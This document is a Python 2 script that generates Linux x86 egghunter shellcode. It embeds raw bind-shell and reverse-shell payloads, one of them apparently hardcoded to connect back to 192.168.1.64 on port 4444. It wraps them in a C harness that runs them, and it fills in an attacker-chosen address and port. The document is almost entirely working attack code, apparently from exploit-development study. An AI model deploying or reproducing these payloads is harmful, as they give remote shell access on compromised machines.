#!/usr/bin/env python

import sys
import struct
import os
import binascii
import socket
from optparse import OptionParser, OptionGroup

shellcode_l = {
	'exec':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc0\xa8\x01\x40\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
	'reverse':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68ADDRESS\x66\x68PORT\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80",
	'bind':"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68PORT\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
}

def eggHunter(egg):
	egghunter = "\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8%s\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"%getEgg(egg)
	return egghunter

def port2hex(port):
	return struct.pack(">H", port)


def address2hex(address):
	addr = binascii.hexlify(socket.inet_aton(address))
	return binascii.unhexlify("".join([addr[i:i+2] for i in range(0, len(addr), 2)]))
	

def getEgg(eggi):
        egg = ""
        for c in range(0, 8, 2):
                egg += "\\x%s%s" % (eggi[c], eggi[c+1])
	return egg

def nullBytes(cad):
        check = [cad.encode('hex')[i:i+2] for i in range(0, len(cad.encode('hex')), 2)]
        for i in check:
                if (i == "00"):
                        print "[-] The payload contains null bytes :("


def reversePayload(egg, address, port):
	port = port2hex(int(port))
	nullBytes(port)
	address = address2hex(address)
	nullBytes(address)
	shellcode = shellcode_l["reverse"]
	shellcode_o = shellcode.replace("PORT", port).replace("ADDRESS", address)
        sc = ""
        for c in bytearray(shellcode_o):
                sc += "\\x%02x" % c
        skeleton(egg, sc)


def bindPayload(egg, port):
	port = port2hex(int(port))
	port_check = [port.encode('hex')[i:i+2] for i in range(0, len(port.encode('hex')), 2)]
	nullBytes(port)
        shellcode = shellcode_l["bind"]
	shellcode_o = shellcode.replace("PORT", port)
        sc = ""
        for c in bytearray(shellcode_o):
                sc += "\\x%02x" % c
        skeleton(egg, sc)



def execPayload(egg):
	shellcode = shellcode_l["exec"]
	sc = ""
	for c in bytearray(shellcode):
		sc += "\\x%02x" % c
	skeleton(egg, sc)


def skeleton(egg, shellcode):
	shellcode_c = '#include<stdio.h>\n\
#include<string.h>\n\
#define EGG "%s"\n\
unsigned char egg_hunter[] = "%s";\n\
unsigned char code[] = \n\
EGG\n\
EGG\n\
"%s";\n\
main(){\n\
printf("Egg hunter Length: %%d\\n", strlen(egg_hunter));\n\
printf("Shellcode Length: %%d\\n", strlen(code));\n\
int (*ret)() = (int(*)())code;\n\
ret();\n\
}'%(getEgg(egg),eggHunter(egg),shellcode)
        print shellcode_c



def opciones():
        parser = OptionParser("usage: %prog [options] \nExample: ./%prog -e 50905090 -p exec")
        parser.add_option("-e", "--egghunter",
                  action="store", type="string", dest="egghunter", help="Egghunter pattern")
        parser.add_option("-p", "--payload",
                  action="store", type="string", dest="payload", help="Payload (exec, bind, reverse)")
        parser.add_option("-x", "--port",
                  action="store", type="string", dest="port", help="Port (bind or reverse payload)")
        parser.add_option("-a", "--address",
                  action="store", type="string", dest="address", help="Address (reverse payload)")
        (options, args) = parser.parse_args()
        if (len(sys.argv) == 1):
            parser.print_help()
        elif (options.egghunter is not None) and (options.payload is not None):
		if (options.payload == "exec"):
			execPayload(options.egghunter)
		elif (options.payload == "bind"):
			if (options.port is not None):
				bindPayload(options.egghunter, options.port)
			else:
				print "[-] Bindi shellcode needs a port"
				
		elif (options.payload == "reverse"):
			if (options.port is not None) and (options.address is not None):
				reversePayload(options.egghunter, options.address, options.port)
			else:
				print "[-] Reverse shellcode needs port and address"
		else:
			print "[-] Payload not valid"
	else:
		print "[-] Need egghunter and payload"


if __name__ == "__main__":
	opciones()
